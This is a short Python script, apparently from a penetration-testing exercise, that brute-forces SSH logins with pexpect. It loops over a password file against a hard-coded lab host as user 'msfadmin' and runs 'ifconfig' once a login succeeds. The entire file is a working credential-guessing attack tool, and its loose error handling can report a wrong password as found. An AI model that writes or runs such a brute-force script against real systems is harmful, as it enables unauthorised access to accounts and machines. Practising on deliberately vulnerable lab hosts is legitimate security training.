#!/usr/bin/python
#imports a password text file with potential password

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child,command):
	child.sendline(command)
	child.expect(PROMPT)
	print(child.before)

def connect(user,host,password):
	ssh_newkey="Are you sure you want to continue connecting"
	connStr="ssh "+user+"@"+host
	child=pexpect.spawn(connStr)
	ret=child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword: '])
	if ret==0:
		print("[-] Error Connecting")
		return
	if ret==1:
		child.sendline('yes')
		ret=child.expect([pexpect.TIMEOUT,'[P|p]assword: '])
		if ret==0:
			print("[-] Error Connecting")
			return
	child.sendline(password)
	child.expect(PROMPT,timeout=0.5)
	return child

def main():
	'''host=str(input("[*] Enter the Host to target: "))
	user=input("[*] Enter the Username: ")
	#password=raw_input("[*] Enter the Password: ")
	'''
	host="192.168.0.104"
	user="msfadmin"
	file=open("passwd.txt","r")
	for password in file.readlines():
		(password)=password.strip('\n')
		try:
			child=connect(user,host,password)
			print('[+] Password Found: '+password)
			send_command(child,"ifconfig")
			break
		except:
			print("[-] Wrong Password: "+password)

main()
